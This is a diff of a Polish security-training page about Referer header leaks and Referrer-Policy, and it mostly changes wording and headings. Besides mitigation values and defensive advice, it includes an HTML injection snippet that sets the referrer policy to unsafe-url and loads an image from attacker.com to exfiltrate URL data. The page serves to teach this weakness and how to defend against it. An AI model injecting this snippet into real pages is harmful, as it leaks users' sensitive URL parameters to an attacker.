@@ -1,16 +1,18 @@
+# Interesujący HTTP
+
 {{#include ../banners/hacktricks-training.md}}
 
-# Nagłówki referrer i polityka
+## Nagłówki Referrer i polityka
 
-Referrer to nagłówek używany przez przeglądarki do wskazania, która była poprzednia odwiedzana strona.
+Referrer to nagłówek używany przez przeglądarki do wskazania poprzednio odwiedzonej strony.
 
-## Wyciek wrażliwych informacji
+### Wyciek poufnych informacji
 
-Jeśli w pewnym momencie na stronie internetowej jakiekolwiek wrażliwe informacje znajdują się w parametrach żądania GET, jeśli strona zawiera linki do zewnętrznych źródeł lub atakujący jest w stanie nakłonić (inżynieria społeczna) użytkownika do odwiedzenia URL kontrolowanego przez atakującego, może być w stanie wyeksfiltrować wrażliwe informacje z ostatniego żądania GET.
+Jeśli w dowolnym momencie na stronie internetowej w parametrach żądania GET znajdują się poufne informacje, a strona zawiera linki do zewnętrznych źródeł lub atakujący może nakłonić (za pomocą inżynierii społecznej) użytkownika do odwiedzenia adresu URL kontrolowanego przez atakującego, możliwe będzie wyeksfiltrowanie poufnych informacji z ostatniego żądania GET.
 
-## Łagodzenie
+### Mitigacja
 
-Możesz sprawić, że przeglądarka będzie przestrzegać **polityki referrer**, która mogłaby **zapobiec** wysyłaniu wrażliwych informacji do innych aplikacji internetowych:
+Możesz skonfigurować przeglądarkę tak, aby stosowała **Referrer-policy**, która może **zapobiec** wysyłaniu poufnych informacji do innych aplikacji webowych:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,15 +23,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Counter-Mitigation
+### Obejście zabezpieczenia
 
-Możesz nadpisać tę regułę, używając tagu meta HTML (atakujący musi wykorzystać i wstrzyknięcie HTML):
+Możesz obejść tę regułę za pomocą tagu meta HTML (atakujący musi wykorzystać HTML injection):
 ```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Obrona
 
-Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET ani w ścieżkach w URL.
+Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET ani ścieżkach URL.
 
 {{#include ../banners/hacktricks-training.md}}
